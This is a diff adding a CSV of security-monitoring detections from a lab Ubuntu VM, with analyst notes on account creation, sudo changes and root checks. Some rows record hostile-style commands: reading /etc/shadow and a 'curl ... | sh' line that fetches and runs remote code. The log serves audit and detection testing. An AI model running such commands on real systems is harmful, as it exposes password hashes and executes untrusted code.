@@ -1,0 +1,15 @@
+Timestamp,Endpoint,Invoking user,Rule ID,Observed command,Analyst note
+2026-10-17 13:58:12.120 +05:30,ubuntu_vm2,vm2,100520,/usr/sbin/useradd testuser_basic,Account-creation action
+2026-10-17 13:59:24.453 +05:30,ubuntu_vm2,vm2,100520,/usr/sbin/useradd -m -s /bin/bash testuser_sudo,Account-creation action
+2026-10-17 14:00:03.459 +05:30,ubuntu_vm2,vm2,100521,/usr/sbin/usermod -aG sudo testuser_basic,Sensitive privilege change; verify intent
+2026-10-17 14:00:40.778 +05:30,ubuntu_vm2,vm2,100520,/usr/sbin/userdel testuser_basic,Cleanup action logged
+2026-10-17 14:00:41.355 +05:30,ubuntu_vm2,vm2,100520,/usr/sbin/userdel testuser_sudo,Cleanup action logged
+2026-10-17 14:21:31.792 +05:30,ubuntu_vm2,vm2,100520,/usr/bin/ls /root,Root directory listing
+2026-10-17 14:22:13.572 +05:30,ubuntu_vm2,vm2,100521,/usr/sbin/visudo -c,Sudoers validation; output says parsed OK
+2026-10-17 14:22:52.852 +05:30,ubuntu_vm2,vm2,100521,/usr/bin/cat /etc/shadow,Sensitive file access; intent requires review
+2026-10-17 14:23:32.566 +05:30,ubuntu_vm2,vm2,100521,/usr/bin/systemctl status ssh,Service status check
+2026-10-17 14:24:16–14:24:40 +05:30,ubuntu_vm2,vm2,100520,/usr/bin/su -c whoami,Root identity checks
+2026-10-17 14:25:23–14:25:51 +05:30,ubuntu_vm2,vm2,100520,/usr/bin/python3 -c ... whoami,Root execution tests
+2026-10-17 14:26:29.561 +05:30,ubuntu_vm2,vm2,100520,/usr/bin/bash -c curl -s http://example.com | sh,Attempt logged; terminal reports shell syntax error
+2026-10-17 14:29:17.011 +05:30,ubuntu_vm2,vm2,100520,/usr/bin/ls /root,Root directory listing
+2026-10-17 14:30:46.744 +05:30,ubuntu_vm2,vm2,100521,/usr/bin/crontab -l,Root crontab query
